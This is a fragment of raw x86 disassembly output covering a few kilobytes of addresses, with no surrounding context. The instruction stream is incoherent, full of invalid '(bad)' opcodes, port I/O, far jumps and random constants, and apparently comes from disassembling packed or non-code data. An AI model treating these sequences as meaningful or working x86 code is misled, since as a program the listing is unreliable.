  413e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e94:	stos   DWORD PTR es:[edi],eax
  413e95:	push   esp
  413e96:	adc    al,bl
  413e98:	push   esp
  413e99:	pop    ds
  413e9a:	dec    ebp
  413e9b:	push   ebp
  413e9c:	inc    edi
  413e9d:	mov    dh,0xd9
  413e9f:	enter  0x5b10,0xf6
  413ea3:	jnp    0x413f23
  413ea5:	int3   
  413ea6:	push   ebp
  413ea7:	mov    al,0x59
  413ea9:	xchg   DWORD PTR [eax+0x4056a7f1],ebx
  413eaf:	adc    al,0x2
  413eb1:	push   ebp
  413eb2:	fcomip st,st(6)
  413eb4:	inc    ecx
  413eb5:	cmp    DWORD PTR [edi],0xffffffc6
  413eb8:	pop    ds
  413eb9:	mov    al,ds:0x8b8ea7bc
  413ebe:	pop    esp
  413ebf:	pop    ecx
  413ec0:	adc    bl,BYTE PTR gs:[ebx-0x2ec34c63]
  413ec7:	jp     0x413f35
  413ec9:	shl    BYTE PTR [eax+0x72],0xbd
  413ecd:	jge    0x413e96
  413ecf:	push   eax
  413ed0:	pop    esp
  413ed1:	dec    esp
  413ed2:	mov    ds:0xbb5726a6,al
  413ed7:	sti    
  413ed8:	loop   0x413e68
  413eda:	ins    BYTE PTR es:[edi],dx
  413edb:	xchg   edx,eax
  413edc:	int    0x5f
  413ede:	pop    ds
  413edf:	repz arpl WORD PTR [ebx],bp
  413ee2:	nop
  413ee3:	loop   0x413ec8
  413ee5:	std    
  413ee6:	(bad)  
  413ee7:	inc    BYTE PTR [ebx]
  413ee9:	mov    ch,ah
  413eeb:	mov    DWORD PTR [edx],esp
  413eed:	imul   edx,esi,0xffffffeb
  413ef0:	xchg   esp,eax
  413ef1:	and    eax,0x88f8a9e4
  413ef6:	ds jae 0x413f4a
  413ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413efa:	pop    edx
  413efb:	fdivr  DWORD PTR [eax-0x24c2d96e]
  413f01:	es cld 
  413f03:	cs and al,0x93
  413f06:	or     eax,0x9d56dc72
  413f0b:	repnz pop ecx
  413f0d:	je     0x413f14
  413f0f:	inc    ecx
  413f10:	stos   DWORD PTR es:[edi],eax
  413f11:	sbb    DWORD PTR [edx-0x22],ebp
  413f14:	add    esi,DWORD PTR [ecx-0x78]
  413f17:	add    al,0x6b
  413f19:	rcr    DWORD PTR [ebp-0x22529f94],cl
  413f1f:	rol    BYTE PTR [edx+0x0],cl
  413f22:	popa   
  413f23:	push   edi
  413f24:	ret    
  413f25:	or     ebx,DWORD PTR [esi]
  413f27:	sti    
  413f28:	jo     0x413eca
  413f2a:	addr16 popa 
  413f2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f2d:	xor    DWORD PTR [eax+0x2e1660fc],eax
  413f33:	sahf   
  413f34:	cmp    DWORD PTR [esi+edi*8+0x550c7a65],0x4d09a733
  413f3f:	add    cl,BYTE PTR [edi+0x21dbb572]
  413f45:	out    0xc8,al
  413f47:	std    
  413f48:	or     eax,0x33f0e097
  413f4d:	inc    eax
  413f4e:	retf   
  413f4f:	out    0x50,eax
  413f51:	out    0x91,al
  413f53:	and    cl,BYTE PTR [ecx+0x74]
  413f56:	or     al,0xc3
  413f58:	ret    0xf3b2
  413f5b:	fcomp  DWORD PTR [edx]
  413f5d:	loopne 0x413fc0
  413f5f:	dec    esi
  413f60:	push   edi
  413f61:	or     DWORD PTR [ecx-0x1c79293f],esi
  413f67:	push   ss
  413f68:	mov    ecx,0xcc8f6d2f
  413f6d:	xor    bh,0x81
  413f70:	hlt    
  413f71:	xchg   BYTE PTR [ecx],ch
  413f73:	pop    DWORD PTR [ebx]
  413f75:	sub    eax,0x3e169c0a
  413f7a:	bound  esi,QWORD PTR [eax+eax*1-0x758b1142]
  413f81:	xor    DWORD PTR [esi],esp
  413f83:	or     al,0xa5
  413f85:	cmp    ah,0xb0
  413f88:	rol    BYTE PTR [edi+0x72617fa2],0x8b
  413f8f:	add    cl,BYTE PTR [esi+0x35]
  413f92:	scas   eax,DWORD PTR es:[edi]
  413f93:	stos   BYTE PTR es:[edi],al
  413f94:	lods   eax,DWORD PTR ds:[esi]
  413f95:	xor    edi,ecx
  413f97:	dec    ecx
  413f98:	add    cl,BYTE PTR [edi+0x53a59686]
  413f9e:	push   ebx
  413f9f:	lods   eax,DWORD PTR ds:[esi]
  413fa0:	les    ebx,FWORD PTR [edi+0x33]
  413fa3:	or     BYTE PTR [edx],dl
  413fa5:	pop    esp
  413fa6:	shr    DWORD PTR [ebx-0x671d5dfa],1
  413fac:	inc    edi
  413fad:	ja     0x413f3e
  413faf:	push   eax
  413fb0:	dec    esi
  413fb1:	out    0x32,eax
  413fb3:	out    0xb5,al
  413fb5:	fucomp st(3)
  413fb7:	shl    DWORD PTR [edi+0x53492c65],0xe0
  413fbe:	jge    0x413f41
  413fc0:	add    al,0x3f
  413fc2:	shl    esi,cl
  413fc4:	clc    
  413fc5:	das    
  413fc6:	sbb    DWORD PTR [ebp+0x5d],esi
  413fc9:	pop    ebp
  413fca:	das    
  413fcb:	cmp    esi,DWORD PTR [ecx]
  413fcd:	jle    0x413f75
  413fcf:	dec    ecx
  413fd0:	in     al,0x38
  413fd2:	xchg   DWORD PTR [edi+0x70cbf6b8],ebx
  413fd8:	or     ecx,DWORD PTR [ecx+0x29af6e86]
  413fde:	jno    0x414040
  413fe0:	push   0xf61d908a
  413fe5:	jns    0x413fad
  413fe7:	xchg   edx,eax
  413fe8:	mov    esp,0x126af0ed
  413fed:	sbb    dh,al
  413fef:	leave  
  413ff0:	add    al,ah
  413ff2:	mov    esp,0x6c6963f0
  413ff7:	out    dx,al
  413ff8:	xchg   edi,eax
  413ff9:	add    BYTE PTR [ebx+0x55],bl
  413ffc:	push   edi
  413ffd:	inc    dh
  413fff:	and    al,cl
  414001:	retf   0xc595
  414004:	clc    
  414005:	shr    DWORD PTR [esi+eiz*8-0x26],1
  414009:	sbb    DWORD PTR [edx+0x76],esp
  41400c:	call   0x66c3c327
  414011:	data16 fsub QWORD PTR [esi+0x16]
  414015:	(bad)  
  414016:	das    
  414017:	sti    
  414018:	pop    edi
  414019:	loopne 0x413fc9
  41401b:	and    ebp,DWORD PTR [edi+esi*8+0x6b]
  41401f:	and    BYTE PTR [esi+esi*1+0x25e5ceee],bh
  414026:	dec    edi
  414027:	pop    ss
  414028:	mov    ch,0x75
  41402a:	jle    0x414026
  41402c:	mov    esi,0xc3afb0f3
  414031:	jb     0x41406b
  414033:	xchg   DWORD PTR [ebx+0x4d],esi
  414036:	das    
  414037:	hlt    
  414038:	pop    ecx
  414039:	push   ecx
  41403a:	addr16 jp 0x414069
  41403d:	les    edx,FWORD PTR [edi-0x2bdde324]
  414043:	pushf  
  414044:	inc    ecx
  414045:	inc    eax
  414046:	sbb    DWORD PTR [ebp-0x38],edx
  414049:	push   cs
  41404a:	cmp    edi,ecx
  41404c:	pop    es
  41404d:	sbb    eax,0xec2c2c4f
  414052:	sti    
  414053:	mov    dl,0x6
  414055:	and    ecx,edx
  414057:	repz mov ds:0x6efa27ed,al
  41405d:	pop    eax
  41405e:	or     bl,dh
  414060:	or     BYTE PTR [eax],0xe5
  414063:	xchg   ebx,eax
  414064:	sbb    eax,0x3dd4e607
  414069:	aas    
  41406a:	add    ebx,DWORD PTR [esi+0x2d2d700b]
  414070:	dec    ecx
  414071:	jmp    0xeb2a2055
  414076:	mov    esp,0x728a5f3a
  41407b:	fcmovu st,st(6)
  41407d:	mov    bl,0xdf
  41407f:	xchg   esi,eax
  414080:	outs   dx,DWORD PTR ds:[esi]
  414081:	ins    BYTE PTR es:[edi],dx
  414082:	out    dx,al
  414083:	jl     0x414058
  414085:	popf   
  414086:	xchg   ecx,eax
  414087:	pop    esp
  414088:	mov    ecx,0xf44d880e
  41408d:	mov    dl,0x5b
  41408f:	push   ebx
  414090:	jmp    0x41406a
  414092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414093:	sub    esp,DWORD PTR [eax+0x1a]
  414096:	inc    edx
  414097:	jb     0x414108
  414099:	addr16 mov ds:0x88b5,eax
  41409d:	mov    dl,0x77
  41409f:	lock or DWORD PTR [esi],ebp
  4140a2:	mov    WORD PTR [ecx+0x2a],gs
  4140a5:	cs scas eax,DWORD PTR es:[edi]
  4140a7:	push   es
  4140a8:	push   esp
  4140a9:	xor    ch,dh
  4140ab:	imul   edx,DWORD PTR [edi-0x4a9665b1],0x58c07b1b
  4140b5:	aam    0x97
  4140b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140b9:	in     eax,0x8
  4140bb:	enter  0x8537,0x26
  4140bf:	and    BYTE PTR [edi+0x57],0x2b
  4140c3:	outs   dx,BYTE PTR ds:[esi]
  4140c4:	push   edi
  4140c5:	and    al,0xe4
  4140c7:	sbb    esi,ecx
  4140c9:	rcr    cl,0xe8
  4140cc:	addr16 mov ebp,0x1f36abe6
  4140d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140d3:	add    al,0x3f
  4140d5:	sbb    DWORD PTR [ebx-0x6542f2d5],esi
  4140db:	idiv   BYTE PTR [edx]
  4140dd:	pop    eax
  4140de:	xchg   edx,eax
  4140df:	sahf   
  4140e0:	mov    edi,0x37da2000
  4140e5:	inc    esp
  4140e6:	push   es
  4140e7:	add    dl,BYTE PTR [ebp+0x4]
  4140ea:	xchg   edx,eax
  4140eb:	xor    al,0x8e
  4140ed:	popa   
  4140ee:	sbb    al,0x72
  4140f0:	mov    eax,ds:0xaf035696
  4140f5:	xor    DWORD PTR [edi+0x1b],ebp
  4140f8:	lahf   
  4140f9:	outs   dx,DWORD PTR ds:[esi]
  4140fa:	adc    esi,ecx
  4140fc:	xor    BYTE PTR [eax+0x89828be],dl
  414102:	rcl    BYTE PTR [ecx-0x1c8ab2bd],cl
  414108:	outs   dx,DWORD PTR ds:[esi]
  414109:	loope  0x414150
  41410b:	jnp    0x414111
  41410d:	add    ebp,DWORD PTR [esi+0x7b10f5d8]
  414113:	(bad)  
  414114:	jl     0x414176
  414116:	pop    esp
  414117:	and    esi,eax
  414119:	cdq    
  41411a:	imul   ecx,DWORD PTR [edi],0x39
  41411d:	out    dx,eax
  41411e:	push   ds
  41411f:	xchg   ebx,eax
  414120:	jne    0x414110
  414122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414123:	das    
  414124:	enter  0x2012,0x50
  414128:	add    ch,cl
  41412a:	or     eax,0xaf435e1c
  41412f:	imul   edi,DWORD PTR [eax-0xd],0xb
  414133:	mov    eax,0x57bd82c3
  414138:	sbb    BYTE PTR [eax],bh
  41413a:	pop    esp
  41413b:	inc    eax
  41413c:	add    bl,al
  41413e:	call   DWORD PTR [esi]
  414140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414141:	ds test eax,0xde149875
  414147:	(bad)  
  414148:	adc    al,BYTE PTR [eax]
  41414a:	cmp    al,0xcb
  41414c:	sbb    BYTE PTR [eax],bl
  41414e:	les    edx,FWORD PTR [eax]
  414150:	inc    ebx
  414151:	mov    edi,0xe92e1882
  414156:	mov    esp,0x8a28eba1
  41415b:	retf   
  41415c:	pop    ebp
  41415d:	in     eax,0x7
  41415f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414160:	mov    cl,0x23
  414162:	ins    BYTE PTR es:[edi],dx
  414163:	jo     0x41410d
  414165:	ins    BYTE PTR es:[edi],dx
  414166:	ret    
  414167:	add    eax,DWORD PTR [esi+0x3f4ecd9e]
  41416d:	pop    eax
  41416e:	or     al,0xb4
  414170:	leave  
  414171:	lds    edx,FWORD PTR gs:[edx]
  414174:	push   es
  414175:	test   eax,0xb719175f
  41417a:	cmp    BYTE PTR [esi+esi*1+0x72],ch
  41417e:	add    cl,0x5a
  414181:	mov    dl,0xd2
  414183:	or     DWORD PTR [esi],0xe14c2ea8
  414189:	sub    ecx,DWORD PTR [ecx+0x3cffba69]
  41418f:	lahf   
  414190:	mov    ds:0x33a9b5ab,al
  414195:	adc    BYTE PTR [ecx-0x460a20e1],0x18
  41419c:	imul   edi,eax,0x546bc111
  4141a2:	in     al,dx
  4141a3:	in     eax,dx
  4141a4:	pop    ebx
  4141a5:	call   0xe952:0xcc5646
  4141ac:	daa    
  4141ad:	adc    dl,dh
  4141af:	jb     0x41416c
  4141b1:	out    dx,al
  4141b2:	mov    eax,ds:0x51ef7d16
  4141b7:	sbb    eax,0x87839f76
  4141bc:	out    dx,al
  4141bd:	pop    ebp
  4141be:	(bad)  
  4141bf:	dec    eax
  4141c0:	mov    esi,0x65ee1acb
  4141c5:	push   es
  4141c6:	arpl   WORD PTR [ebx+0x4e],di
  4141c9:	mul    DWORD PTR [esi+0xd]
  4141cc:	jbe    0x414239
  4141ce:	mov    edi,0xfce7939b
  4141d3:	push   ebx
  4141d4:	sbb    dh,0xb6
  4141d7:	mov    ah,0xc1
  4141d9:	imul   ebp,DWORD PTR [esi],0x7e
  4141dc:	mov    al,ds:0x3bd16feb
  4141e1:	dec    edx
  4141e2:	mov    cl,0xf1
  4141e4:	out    0x62,eax
  4141e6:	out    0x10,al
  4141e8:	ja     0x41423d
  4141ea:	add    BYTE PTR [ebp-0x68],bl
  4141ed:	btr    DWORD PTR [esi-0x2b],ebx
  4141f1:	in     eax,0x27
  4141f3:	sub    eax,0x40fab657
  4141f8:	aaa    
  4141f9:	xor    eax,0xda75816a
  4141fe:	mov    edx,0xc598512a
  414203:	sub    DWORD PTR [ecx+0x3f],0x20
  414207:	dec    edx
  414208:	out    dx,eax
  414209:	icebp  
  41420a:	mov    edx,ss
  41420c:	pusha  
  41420d:	movaps xmm5,XMMWORD PTR [ecx]
  414210:	mov    esp,0xfa688eaa
  414215:	add    eax,0x5ab7850f
  41421a:	inc    edx
  41421b:	sbb    al,0x46
  41421d:	clc    
  41421e:	ja     0x414293
  414220:	inc    esp
  414221:	xor    DWORD PTR [eax+0x21fef12a],esp
  414227:	dec    eax
  414228:	and    eax,0x2e84bc13
  41422d:	int3   
  41422e:	lock or eax,0x9e84cc3a
  414234:	int3   
  414235:	mov    ah,0x67
  414237:	jl     0x414255
  414239:	jae    0x414230
  41423b:	das    
  41423c:	inc    esi
  41423d:	aam    0x9d
  41423f:	(bad)  [edi+0x566e5ba8]
  414245:	mov    ah,BYTE PTR [esi+0x2beef3af]
  41424b:	and    esp,DWORD PTR [esi+edi*8-0x1b3b1c21]
  414252:	mov    dh,0xd8
  414254:	shr    DWORD PTR [edi+0x650f3472],0x4c
  41425b:	jmp    0xd125:0x35fe391c
  414262:	mov    dh,0x11
  414264:	cmp    BYTE PTR [edi+0x2ebb715b],ah
  41426a:	adc    BYTE PTR [edx-0x7b95091c],bl
  414270:	pop    edx
  414271:	fidivr DWORD PTR [eax]
  414273:	xchg   edi,eax
  414274:	add    ebp,DWORD PTR [ecx+0x11]
  414277:	xlat   BYTE PTR ds:[ebx]
  414278:	aas    
  414279:	(bad)  
  41427a:	jns    0x4142d8
  41427c:	xchg   esp,eax
  41427d:	jmp    0x7e30:0x225f6b02
  414284:	lds    ecx,FWORD PTR [esi]
  414286:	scas   al,BYTE PTR es:[edi]
  414287:	inc    edi
  414288:	add    BYTE PTR [ebp-0x2f],al
  41428b:	adc    eax,0xfcd71606
  414290:	shr    BYTE PTR [ecx-0x4d],cl
  414293:	inc    ebx
  414294:	xchg   edx,eax
  414295:	idiv   DWORD PTR [ebx-0x3e]
  414298:	jge    0x41428f
  41429a:	pop    edi
  41429b:	and    ebx,DWORD PTR [edx-0x7e]
  41429e:	imul   esi,DWORD PTR [edi+0x2a],0x1fc45e63
  4142a5:	push   0x70
  4142a7:	ucomiss xmm6,DWORD PTR [edx+0x3fd0ccd1]
  4142ae:	in     al,0xed
  4142b0:	xlat   BYTE PTR ds:[ebx]
  4142b1:	jge    0x4142a8
  4142b3:	hlt    
  4142b4:	fild   QWORD PTR [ecx]
  4142b6:	xchg   ecx,eax
  4142b7:	xchg   edx,eax
  4142b8:	jns    0x41429f
  4142ba:	pop    esp
  4142bb:	mov    ebx,0x69a97bc3
  4142c0:	cmc    
  4142c1:	dec    ecx
  4142c2:	dec    edx
  4142c3:	sar    BYTE PTR [esi+0x75],1
  4142c6:	leave  
  4142c7:	jb     0x414341
  4142c9:	jmp    0xf5d6:0x928b4942
  4142d0:	cmp    DWORD PTR ds:0x30eceb81,esi
  4142d6:	xor    al,0xb
  4142d8:	les    esi,FWORD PTR [ebx+0x341e6de8]
  4142de:	cmc    
  4142df:	in     al,dx
  4142e0:	xor    bh,BYTE PTR [ecx-0x45]
  4142e3:	and    al,0x92
  4142e5:	mov    esi,0x565f31ab
  4142ea:	shl    DWORD PTR [ecx+esi*8],1
  4142ed:	mov    ss,eax
  4142ef:	das    
  4142f0:	push   eax
  4142f1:	leave  
  4142f2:	fstp   TBYTE PTR [ebx]
  4142f4:	pop    ecx
  4142f5:	(bad)  
  4142f6:	addr16 push 0xffffffa4
  4142f9:	nop
  4142fa:	sbb    BYTE PTR [edi],ah
  4142fc:	outs   dx,BYTE PTR ds:[esi]
  4142fd:	jl     0x4142cb
  4142ff:	dec    eax
  414300:	add    BYTE PTR [ebx],bl
  414302:	pop    ebx
  414303:	out    0x2c,al
  414305:	lea    eax,[esi+edi*8+0xb59924b]
  41430c:	pop    esi
  41430d:	push   edx
  41430e:	sbb    BYTE PTR ds:0x7ac8ad6a,cl
  414314:	or     edx,edx
  414316:	jecxz  0x414385
  414318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414319:	cdq    
  41431a:	dec    esi
  41431b:	sbb    DWORD PTR [edx-0x50b927df],esi
  414321:	lods   eax,DWORD PTR ds:[esi]
  414322:	fisttp WORD PTR [edi+esi*4+0x6c]
  414326:	scas   eax,DWORD PTR es:[edi]
  414327:	sub    bl,BYTE PTR ds:[ebp-0x579418a8]
  41432e:	add    cl,BYTE PTR [edi+0x134b1b1e]
  414334:	xchg   bp,ax
  414336:	arpl   WORD PTR [eax-0x2c],bp
  414339:	repz shl DWORD PTR [edi-0x51],cl
  41433d:	mov    eax,ds:0x1c03e894
  414342:	push   cs
  414343:	imul   ebx,DWORD PTR [ecx-0x43],0xb300abb5
  41434a:	jmp    0xf58fefa8
  41434f:	dec    edi
  414350:	inc    eax
  414351:	test   eax,0x7491fff
  414356:	jecxz  0x4143cd
  414358:	mov    al,0xd7
  41435a:	mov    cl,0xbd
  41435c:	(bad)  
  41435d:	ds jmp 0xbc3c:0x63079b95
  414365:	out    0x99,eax
  414367:	repnz icebp 
  414369:	mov    eax,ds:0x4811bfa
  41436e:	dec    ecx
  41436f:	adc    BYTE PTR [edx+0x645ee963],dh
  414375:	mov    al,0x3b
  414377:	jns    0x414345
  414379:	sub    edi,ecx
  41437b:	(bad)  
  41437c:	int    0x91
  41437e:	imul   ecx,DWORD PTR [edi-0x2cb3eef5],0xfffffff0
  414385:	std    
  414386:	jno    0x414314
  414388:	into   
  414389:	mov    dl,0x75
  41438b:	rcl    DWORD PTR [ebx-0x5d],0x24
  41438f:	mov    dl,BYTE PTR [esi-0x2c]
  414392:	rep lods eax,DWORD PTR ds:[esi]
  414394:	mov    eax,0xeb1e22c1
  414399:	std    
  41439a:	lods   eax,DWORD PTR ds:[esi]
  41439b:	or     dh,BYTE PTR [eax]
  41439d:	or     al,0xba
  41439f:	mov    cl,ah
  4143a1:	mov    dl,0xaf
  4143a3:	jo     0x41434f
  4143a5:	and    BYTE PTR [esi+0xf661261],0xb
  4143ac:	shr    al,cl
  4143ae:	mov    DWORD PTR [ebx+0x25a3e380],ebp
  4143b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143b5:	and    BYTE PTR ds:0xd22a00a0,dh
  4143bb:	xor    al,0xfe
  4143bd:	lahf   
  4143be:	sbb    dh,al
  4143c0:	imul   edi,DWORD PTR [edx+0xf],0xfffffff5
  4143c4:	imul   ebp,DWORD PTR [ebp+edi*2-0x13fcdb7],0xe484b11f
  4143cf:	js     0x414405
  4143d1:	dec    edi
  4143d2:	loop   0x4143b9
  4143d4:	cs jle 0x4143cc
  4143d7:	lea    esi,[ecx+0x49]
  4143da:	popa   
  4143db:	fs xchg ecx,eax
  4143dd:	mov    eax,?
  4143df:	inc    esp
  4143e0:	jge    0x4143d3
  4143e2:	ror    ebp,0xba
  4143e5:	sbb    BYTE PTR [esi],ch
  4143e7:	and    esp,DWORD PTR ds:0x8d918ccd
  4143ed:	sub    BYTE PTR [esi-0x20],bl
  4143f0:	outs   dx,DWORD PTR ds:[esi]
  4143f1:	(bad)  
  4143f2:	shr    DWORD PTR [edx+ecx*4],cl
  4143f5:	imul   ebx,DWORD PTR [edi],0x5ed1582e
  4143fb:	jne    0x41444b
  4143fd:	cld    
  4143fe:	lds    ebp,FWORD PTR [edx+0x48]
  414401:	in     al,0xa8
  414403:	xor    eax,0x6ce033f3
  414408:	mov    ch,0xa2
  41440a:	(bad)  
  41440b:	(bad)  
  41440c:	lods   al,BYTE PTR ds:[esi]
  41440d:	lods   al,BYTE PTR ds:[esi]
  41440e:	fmul   QWORD PTR [edx-0x52]
  414411:	test   eax,0xfa03ed6f
  414416:	fidivr WORD PTR ds:0xc08d1d3
  41441c:	push   0xffffff81
  41441e:	or     BYTE PTR [edi],ch
  414420:	mov    cl,dh
  414422:	jecxz  0x4143e6
  414424:	sbb    DWORD PTR [ebx-0x6e],eax
  414427:	or     eax,0x966a4152
  41442c:	mov    edi,0xd9b6de96
  414431:	sar    BYTE PTR [ecx],cl
  414433:	lods   eax,DWORD PTR ds:[esi]
  414434:	xlat   BYTE PTR ds:[ebx]
  414435:	(bad)  
  414436:	in     eax,0x87
  414438:	shl    edx,1
  41443a:	clc    
  41443b:	ins    BYTE PTR es:[edi],dx
  41443c:	mov    esp,ecx
  41443e:	or     DWORD PTR [esi-0x288cc986],0xac0c9c05
  414448:	rol    DWORD PTR [eax+0x13292a09],0xb8
  41444f:	or     al,0x1
  414451:	retf   
  414452:	icebp  
  414453:	ins    DWORD PTR es:[edi],dx
  414454:	cmp    eax,0x221978f9
  414459:	xchg   edx,eax
  41445a:	outs   dx,BYTE PTR ds:[esi]
  41445b:	ret    0x446c
  41445e:	mov    edi,DWORD PTR [ebx]
  414460:	add    al,BYTE PTR [edi-0x307fefbf]
  414466:	and    bh,BYTE PTR [ecx-0x59736f9f]
  41446c:	loop   0x41442d
  41446e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41446f:	push   ds
  414470:	pop    esi
  414471:	sahf   
  414472:	jmp    0x4144a6
  414474:	sub    ebp,DWORD PTR [edi-0x46]
  414477:	inc    ebp
  414478:	push   ebx
  414479:	mov    dh,0xe6
  41447b:	cmp    al,0x52
  41447d:	add    DWORD PTR [ecx],ebx
  41447f:	mov    BYTE PTR [ecx-0x21],dh
  414482:	mov    dl,0xfa
  414484:	jmp    0x8c7d:0x6358c0a9
  41448b:	jbe    0x4144d5
  41448d:	jb     0x41442a
  41448f:	cmp    edi,DWORD PTR [edi-0x38d0044a]
  414495:	ins    DWORD PTR es:[edi],dx
  414496:	test   eax,0xbd675919
  41449b:	xor    bh,0x6a
  41449e:	cmp    bh,BYTE PTR [ebx]
  4144a0:	push   edx
  4144a1:	or     BYTE PTR [edx+0x42],dl
  4144a4:	cmp    eax,0xd9ddbc56
  4144a9:	xchg   esp,eax
  4144aa:	leave  
  4144ab:	or     eax,0x4e3e1f16
  4144b0:	sub    DWORD PTR [ebx+0x7ec157a],esi
  4144b6:	adc    eax,0x813482a9
  4144bb:	arpl   WORD PTR [edi],ax
  4144bd:	(bad)  
  4144bf:	jle    0x4144f8
  4144c1:	pop    es
  4144c2:	or     ebp,DWORD PTR [eax-0x40e761af]
  4144c8:	inc    esp
  4144c9:	lods   al,BYTE PTR ds:[esi]
  4144ca:	addr16 jbe 0x414465
  4144cd:	xor    BYTE PTR [eax-0x3d],bl
  4144d0:	xchg   edx,eax
  4144d1:	inc    edi
  4144d2:	xor    DWORD PTR [esi+esi*8],0x7569e24f
  4144d9:	add    eax,DWORD PTR [eax-0x15e0e600]
  4144df:	or     eax,0xdbf4e9fd
  4144e4:	mov    dl,0x4
  4144e6:	pop    edi
  4144e7:	push   ebx
  4144e8:	xlat   BYTE PTR ds:[ebx]
  4144e9:	mov    eax,ds:0x54748dcf
  4144ee:	and    eax,0xb309114f
  4144f3:	adc    ah,BYTE PTR [edx-0x39]
  4144f6:	pop    eax
  4144f7:	mov    dl,0xa8
  4144f9:	dec    edx
  4144fa:	mov    eax,0x1c45ff1a
  4144ff:	rcl    BYTE PTR [ebp+0x50],1
  414502:	adc    eax,0x74f1f2e6
  414507:	push   esi
  414508:	popa   
  414509:	mov    ch,0x5
  41450b:	in     al,dx
  41450c:	pusha  
  41450d:	mov    ch,0x4b
  41450f:	bound  edi,QWORD PTR [edx-0x3]
  414512:	mov    eax,ds:0x7c643def
  414517:	js     0x4144c9
  414519:	pop    edx
  41451a:	jp     0x414514
  41451c:	idiv   ecx
  41451e:	sub    edx,DWORD PTR [ebp+0x59]
  414521:	les    edx,FWORD PTR [esi]
  414523:	lods   eax,DWORD PTR ds:[esi]
  414524:	dec    esp
  414525:	fadd   st(4),st
  414527:	lods   al,BYTE PTR ds:[esi]
  414528:	xor    eax,0x95de7456
  41452d:	out    dx,al
  41452e:	push   0x1940ca50
  414533:	scas   al,BYTE PTR es:[edi]
  414534:	pop    esi
  414535:	pop    ds
  414536:	out    dx,eax
  414537:	sub    DWORD PTR [eax-0x234340a8],edi
  41453d:	mov    dl,ah
  41453f:	jmp    0x30ff:0x5e1adb26
  414546:	out    dx,al
  414547:	push   0xe44e32fa
  41454c:	xor    dl,al
  41454e:	jmp    0x6702:0xde1a5caa
  414555:	add    edx,edi
  414557:	or     ch,al
  414559:	lahf   
  41455a:	hlt    
  41455b:	hlt    
  41455c:	pop    ecx
  41455d:	test   cl,cl
  41455f:	inc    ebx
  414560:	int3   
  414561:	xor    DWORD PTR [ebx+edi*2+0x43a1f8c2],ebx
  414568:	cmp    al,0x1
  41456a:	pop    ecx
  41456b:	xchg   BYTE PTR [ebp-0xca0d2a9],dl
  414571:	lahf   
  414572:	call   0x4064:0xbb6fcea
  414579:	xchg   ecx,eax
  41457a:	jnp    0x414574
  41457c:	adc    al,BYTE PTR ds:0x2e6875c0
  414582:	ret    
  414583:	push   es
  414584:	(bad)  
  414585:	ror    BYTE PTR [edx-0x599e9db],0xd2
  41458c:	xchg   esi,eax
  41458d:	js     0x414599
  41458f:	leave  
  414590:	xchg   BYTE PTR [ebp-0x2a947015],bh
  414596:	cli    
  414597:	jmp    0x673b:0xf0f7b3b7
  41459e:	leave  
  41459f:	cmp    DWORD PTR [ecx+0x2055180],ecx
  4145a5:	and    DWORD PTR [esi-0x31],ebp
  4145a8:	xchg   esp,eax
  4145a9:	xchg   edi,eax
  4145aa:	wbinvd 
  4145ac:	not    ch
  4145ae:	jo     0x4145a7
  4145b0:	push   es
  4145b1:	inc    ebp
  4145b2:	and    eax,0xf2d80b4
  4145b7:	push   esi
  4145b8:	fstp   TBYTE PTR [eax+ebp*1+0x77]
  4145bc:	outs   dx,DWORD PTR ds:[esi]
  4145bd:	and    BYTE PTR [esi+0x1a87de3a],ch
  4145c3:	sub    al,0x14
  4145c5:	stc    
  4145c6:	enter  0x6e24,0xba
  4145ca:	enter  0x9cda,0x33
  4145ce:	add    al,0x1f
  4145d0:	je     0x41455c
  4145d2:	inc    ebp
  4145d3:	ins    DWORD PTR es:[edi],dx
  4145d4:	cdq    
  4145d5:	retf   0xd73a
  4145d8:	mov    edi,0xb16c3a29
  4145dd:	emms   
  4145df:	stc    
  4145e0:	inc    ebp
  4145e1:	fidiv  DWORD PTR [ecx-0x34]
  4145e4:	aaa    
  4145e5:	bound  eax,QWORD PTR [ecx]
  4145e7:	xor    dh,BYTE PTR [edx+0x16]
  4145ea:	mov    edx,esp
  4145ec:	test   al,0xab
  4145ee:	push   0x1f5442a4
  4145f3:	stos   DWORD PTR es:[edi],eax
  4145f4:	mov    eax,0xf1ebaa30
  4145f9:	mov    esp,0x63be6738
  4145fe:	stc    
  4145ff:	push   ds
  414600:	ins    BYTE PTR es:[edi],dx
  414601:	(bad)  
  414602:	sub    ebx,DWORD PTR [esi]
  414604:	scas   eax,DWORD PTR es:[edi]
  414605:	jns    0x41461b
  414607:	jne    0x4145c2
  414609:	mov    ebp,0xc042e0dc
  41460e:	call   0xbb19:0xe79dbee2
  414615:	lods   al,BYTE PTR ds:[esi]
  414616:	adc    al,0xcf
  414618:	shr    eax,0x80
  41461b:	int3   
  41461c:	popf   
  41461d:	push   esi
  41461e:	xor    eax,0xa13912b9
  414623:	(bad)  
  414624:	ror    DWORD PTR [ebx-0x558cbde7],1
  41462a:	pusha  
  41462b:	or     BYTE PTR [esi+0x4e5f14c],dh
  414631:	inc    ebx
  414632:	cmp    ah,BYTE PTR [ecx-0x65]
  414635:	dec    eax
  414636:	add    eax,0xfdf145ae
  41463b:	mov    bh,0x51
  41463d:	ins    DWORD PTR es:[edi],dx
  41463e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41463f:	pop    ds
  414640:	mov    ah,cl
  414642:	pop    edi
  414643:	dec    ecx
  414644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414645:	mov    ecx,esi
  414647:	out    0xc8,al
  414649:	inc    ebx
  41464a:	clc    
  41464b:	jl     0x414681
  41464d:	fsubr  DWORD PTR [edx]
  41464f:	mov    bl,0xff
  414651:	jmp    0xd5a26c1c
  414656:	fwait
  414657:	xor    al,0xb2
  414659:	das    
  41465a:	dec    eax
  41465b:	mov    esi,0xdb1dd135
